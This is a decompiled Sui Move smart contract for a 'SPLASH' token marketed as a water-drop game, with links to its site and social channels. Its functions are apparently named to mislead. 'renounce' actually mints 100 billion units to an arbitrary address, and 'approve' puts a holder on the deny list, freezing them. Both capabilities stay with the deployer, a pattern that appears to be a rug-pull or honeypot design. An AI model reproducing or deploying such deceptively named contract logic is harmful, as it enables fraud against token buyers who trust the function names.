module 0xc56df94d5d21207001acbf5b74c8cb493ae7d83ca7cdb6f832db76198d36f09b::splash {
    struct SPLASH has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SPLASH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SPLASH>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SPLASH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SPLASH>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SPLASH, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SPLASH>(arg0, 2, b"SPLASH", b"SPLASH", b"Welcome to SPLASH QUEST, an exciting game where players catch water drops to earn $SPLASH tokens. Engage in thrilling gameplay, compete in championships, and earn rewards! https://suisplash.online/ - https://suisplash.online/whitepaper.html - https://t.me/suiSplash - https://x.com/suiSplash", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://suisplash.online/drop.gif"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SPLASH>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<SPLASH>(&mut v3, 10000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SPLASH>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SPLASH>>(v1, v4);
    }

    public entry fun renounce(arg0: &mut 0x2::coin::TreasuryCap<SPLASH>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<SPLASH>(arg0, 100000000000, arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

